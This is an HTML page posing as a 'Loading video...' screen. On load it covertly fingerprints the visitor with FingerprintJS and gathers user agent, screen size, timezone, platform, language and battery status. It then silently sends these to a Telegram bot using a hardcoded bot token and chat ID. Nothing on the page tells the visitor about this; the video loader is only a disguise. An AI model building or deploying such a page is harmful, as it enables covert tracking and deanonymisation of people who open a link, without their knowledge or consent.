<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading video...</title>
  <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
  <style>
    body {
      background-color: #000;
      color: #fff;
      text-align: center;
      padding-top: 50px;
      font-family: sans-serif;
    }
    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <h2>Loading video...</h2>

  <script>
    (async () => {
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      const extraInfo = {
        screen: window.screen.width + "x" + window.screen.height,
        language: navigator.language,
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        battery: await navigator.getBattery().then(b => ({
          charging: b.charging,
          level: b.level
        })).catch(() => "Battery API blocked"),
      };

      const message = `
New Visit Detected! 🚀
-----------------------------
🖥️ VisitorID: ${result.visitorId}
🌐 User-Agent: ${extraInfo.userAgent}
📱 Screen: ${extraInfo.screen}
🕰️ Timezone: ${extraInfo.timezone}
🔋 Battery: ${typeof extraInfo.battery === 'string' ? extraInfo.battery : (extraInfo.battery.charging ? 'Charging' : 'Not Charging')} (${extraInfo.battery.level * 100}%)
💻 Platform: ${extraInfo.platform}
🗣️ Language: ${extraInfo.language}
`;

      const token = '7978235751:AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg';
      const chatId = '363719597';
      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    })();
  </script>
</body>
</html>
